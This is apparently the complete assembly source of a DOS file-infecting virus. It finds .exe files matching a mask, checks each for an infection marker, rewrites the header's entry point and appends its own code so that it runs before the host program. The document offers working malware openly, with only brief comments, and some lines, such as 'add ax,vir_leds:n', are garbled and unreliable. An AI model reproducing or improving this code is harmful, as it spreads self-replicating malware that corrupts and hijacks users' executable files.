.model small
.stack 100h
.code
start:
    push cs
    pop ds

fresh_bytes:
    ; original entry point calculation
    push es
    pop ax
    add ax,10h
    add ax,cs:old_cs
    push ax
    mov ax,cs:old_ip
    push ax

find_first:
    ; finding the first .exe file
    mov ah, 4eh
    xor cx,cx
    lea dx,fmask
find_first_next:
    int 21h
    jc exit

open:
    ; found file opening
    push es
    pop ds
    mov ax, 3d02h
    push bx
    mov bx, 9eh
    lea dx, [bx]
    pop bx
    int 21h
    push cs
    pop ds
    jc find_next

save_bytes:
    ; reading exe header
    xchg bx,ax
    mov ah,03fh
    mov cx,1Ah
    lea dx,header
    int 21h
    jc find_next

infection_check:
    ; check for infection
    cmp byte ptr cs:[header+13h], 69h
    jz find_next

    ; saving ip0 & cs0
    mov ax,word ptr cs:[header+14h]
    mov cs:old_ip,ax
    mov ax,word ptr cs:[header+16h]
    mov cs:old_cs,ax

    ; calculating new header values
    call calculate_header

write_vir:
    ; writing the payload to the end of the file
    mov ax,4200h
    int 21h
    jc find_next
    mov ah,40h
    mov cx,vir_len
    lea dx,start
    int 21h
    jc find_next

write_header:
    ; writing the modded header
    mov ax,4200h
    xor cx,cx
    xor dx,dx
    int 21h
    jc find_next
    mov ah,40h
    mov cx,1Ah
    lea dx,header
    int 21h

find_next:
    ; closing current file and moving next
    mov ah,3eh
    int 21h
    mov ah,4fh
    jmp find_first_next

exit:
    ; restoring ds
    push es
    pop ds

    ; transferring control to original program
    retf

; the new header vals calc proc
calculate_header proc

    ; infection mark
    mov byte ptr cs:[header+13h], 69h

    ; filesize from DTA
    mov ax,word ptr es:[9Ah]
    mov dx,word ptr es:[9Ch]

    ; modding filesize
    or ax,0000Fh
    inc ax
    adc dx,0
    push ax
    push dx
    push ax

    ; calculating offset of the virus
    mov cx,10h
    div cx
    sub ax,word ptr cs:[header+8]

    ; the remainder of modded virus offset
    mov word ptr cs:[header+14h],dx

    ; the quotent of modded virus offset
    mov word ptr cs:[header+16h],ax

    ; adding the vir offset to low part
    pop ax
    and ah,1
    add ax,vir_leds:n
    cmp ax,512
    jb ok

    ; if bigger then 512, then correcting 2 fileds
    ; only one otherwise
    sub ax,512
    mov dx,word ptr cs:[header+4]
    inc dx
    mov word ptr cs:[header+4],dx
    ok:
    mov word ptr cs:[header+2],ax

    ; saving the file pointer
    pop cx
    pop dx
    ret
    calculate_header endp

exe_end:
    ; modelling start from infected program
    mov ax,4C00h
    int 21h

; data
old_ip dw offset exe_end
old_cs dw 0
fmask db 'avic4.exe',0
header equ $
vir_len equ $-start
end start
